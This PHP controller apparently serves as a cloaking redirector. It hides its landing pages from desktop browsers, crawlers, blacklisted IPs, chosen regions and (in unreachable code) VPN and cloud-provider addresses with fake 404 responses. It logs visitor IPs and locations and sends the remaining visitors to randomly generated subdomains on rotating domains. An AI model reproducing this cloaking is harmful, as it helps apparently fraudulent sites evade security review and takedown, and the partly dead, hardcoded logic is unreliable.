<?php
namespace app\index\controller;

use think\facade\Request;
use app\method\controller\Base;
use think\Db;
use think\facade\Cookie;
class Index extends Base
{

	public $temp = '/t/';

	public $base;

	public function __construct()
	{
		parent::__construct();
		$this->base = new \app\method\controller\Base();
		$this->sql = new \app\method\controller\Sql();
	}
	
    public function index()
    {
        
        //var_dump(ipToAddress(Request()->ip()));die;
        //判断是否PC
        if(is_pc()) return '<div style="color:#000;width:100%;margin-top:100px;text-align:center;">您现在浏览的是手机版本，请使用手机访问</div>';
        //判断是否爬虫
        if(is_reptile()) return header("status: 404 Not Found");
        
        //取站点信息
		$baseUrl = $this->base->hookBaseurl();
		$wid = $this->base->url2Wid($baseUrl);
		$wid = '82';
		if(!$wid) return header("status: 404 Not Found");
		
		
		//取站点详情
		$webdetail = Db::name('web')->where(['id' => $wid])->field('vid,tempdir,sendurl,end_time,status,is_vpn,key,region,isdomain')->find();
		if($webdetail['status'] === 0) die('站点异常');
		
		$vos = Db::name('view')->where(['id' => $webdetail['vid']])->value('os');
		
		
		//域名判断
		
		$domainConfig = file_get_contents('./config.tt');
		$domainConfig = json_decode($domainConfig, true);
		$burl = $_SERVER['HTTP_HOST'];
		
		if(!in_array($burl,explode('|', $domainConfig['send_url']))) return header("status: 404 Not Found");
		
		
		//判断是否ip被拉黑，同时插入日志
		$adr = $this->insertLog($wid);
		if(!$adr) return header("status: 404 Not Found");
		
		
		$address = ipToAddress(Request()->ip());
		
		//var_dump($address);die;
		//区域限制
		if(!empty($domainConfig['adr']))
		{
		    foreach (explode('|',$domainConfig['adr']) as $v)
		    {
		        if(strstr($address,$v) !== false)
		        {
		            return header("status: 404 Not Found");
		        }
		    }
		}
		
		$urlarr = explode('|',$domainConfig['base_url']);
		
		$url = 'http://' . rand_str(10) . '.' . $urlarr[array_rand($urlarr)] . $this->temp;
		
		return $this->redirect($url);
		
		//获取IP详细信息，同时判断vpn 数据厂商
		$ipdetail = ip2detail(Request()->ip(), $webdetail['key']);
		//var_dump($webdetail);die;
		if((int)$webdetail['is_vpn'] === 0)
		{
		    if($ipdetail['security']['is_cloud_provider'] || $ipdetail['security']['is_vpn'] || $ipdetail['security']['is_anonymous']) return header("status: 404 Not Found");
		}
        
        //查询可用domain
        $domainlist = Db::name('domainlog')->where(['wid' => $wid])->field('domain')->select();
        
        $domainarr = [];
        foreach ($domainlist as $v)
        {
            if($v['domain'] != $baseUrl)
            {
                array_push($domainarr, $v['domain']);
            }
        }
        
        if((int)$webdetail['isdomain'] === 1)
        {
            $url = 'http://' . rand_str(10) . '.' . $domainarr[array_rand($domainarr)] . $this->temp . $webdetail['tempdir'];
        }else{
            $url = 'http://' . Request()->host() . $this->temp . $webdetail['tempdir'];
        }
        //var_dump(Request()->host());die;  Request()->host()
        //(time() + 10) 时间容错
		
		//var_dump($url);die;
		$viewarr = [16];
		
		$time = (time() - 8*3600) + ($ipdetail['time_zone']['offset']);
		//var_dump($time,time());die;
		if(in_array($webdetail['vid'], $viewarr))
		{
		    if($vos == 2)
		    {
		        $url .= is_pc() ? '/index.html?s='. ($time + 50) : '/m/index.html?s='. ($time + 50);
		    }
		}else {
		    $url .= '/#/?s=' . ($time + 50);
		}
		
		$this->redirect($url);
        
    }

    /**
     * 插入当前日志
     */
    public function insertLog($wid)
    {
    	$res = Db::name('visitlog')->where(['wid' => $wid, 'ip' => Request()->ip()])->field('status,id,address')->find();
    	
    	
    	//判断用户再次访问
    	if(!empty($res))
    	{
    	    
    	    if($res['status'] === 0) return false;
    	    $data = [
    	        
    	        'time' => time(),
    	        'os' => get_os(),
				'referer' => Request()->domain(),
				'agent' => Request()->header('user-agent')
    	    ];
    	    Db::name('visitlog')->where(['id' => $res['id']])->update($data);
    	    return $res['address'];
    	}
    	$data = [
    			'wid' => $wid,
				'ip' => Request()->ip(),
				'os' => get_os(),
				'referer' => Request()->domain(),
				'agent' => Request()->header('user-agent'),
				'address' => ipToAddress(Request()->ip()),
				'time' => time()
			];
    	Db::name('visitlog')->insert($data);
    	return $data['address'];
    	
    }
}
